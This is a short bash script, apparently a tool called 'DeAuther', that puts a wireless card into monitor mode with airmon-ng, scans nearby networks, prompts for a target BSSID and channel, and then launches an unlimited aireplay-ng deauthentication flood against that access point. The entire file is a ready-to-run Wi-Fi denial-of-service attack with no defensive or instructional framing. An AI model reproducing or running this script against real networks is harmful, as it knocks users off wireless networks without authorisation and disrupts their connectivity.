if [[ $EUID -ne 0 ]]; then
   echo -e "\033[1;91m\n[!] DeAuther must be run as root. Aborting....¯\_(ツ)_/¯ \n\033[1;m";
   exit 1;
fi   



airmon-ng start wlan0



airodump-ng wlan0mon



printf "\n"
read -p $'\033[1;91m[!]Please Enter Target BSSID: \033[1;m' BSSID
printf "\n"
echo ">> BSSID: $BSSID" | lolcat
printf "\n"

read -p $'\033[1;91m[!]Please Enter Target CH: \033[1;m' CH
printf "\n"
echo ">> Channel No: $CH" | lolcat
printf "\n"

airodump-ng -c $CH --bssid $BSSID wlan0mon

aireplay-ng -0 0 -a $BSSID wlan0mon
